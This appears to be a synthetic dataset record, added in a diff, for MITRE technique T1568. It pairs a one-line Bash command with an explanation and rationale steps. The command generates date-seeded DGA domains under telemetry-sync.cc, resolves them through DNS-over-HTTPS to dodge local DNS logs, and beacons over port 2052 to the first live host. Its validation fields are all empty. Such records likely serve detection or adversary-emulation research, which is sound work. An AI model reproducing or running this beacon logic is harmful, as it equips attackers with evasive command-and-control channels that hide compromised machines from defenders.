@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"eta\"; CANDS=(); for i in $(seq 1 3); do CANDS+=(\"$(printf \"%s\" \"${SEED}$(date -u +%Y%m%d)$i\" | sha256sum | cut -c1-12).telemetry-sync.cc\"); done; for FQDN in \"${CANDS[@]}\"; do if curl -sSfI --doh-url https://dns.quad9.net/dns-query --connect-timeout 2 \"https://${FQDN}:2052/ping\"; then curl -sS --doh-url https://dns.quad9.net/dns-query \"https://${FQDN}:2052/beacon?rnd=$RANDOM\"; break; fi; done",
+  "explanation": "Produces several DGA candidates, uses DoH against Quad9 to test reachability, and then communicates over port 2052 to blend with atypical TLS traffic.",
+  "rationale_steps": [
+    "Generate multiple candidate DGA domains",
+    "Resolve via DoH to avoid local DNS logs",
+    "Probe for a live endpoint on port 2052",
+    "Send beacon once an endpoint responds"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-e3093459",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
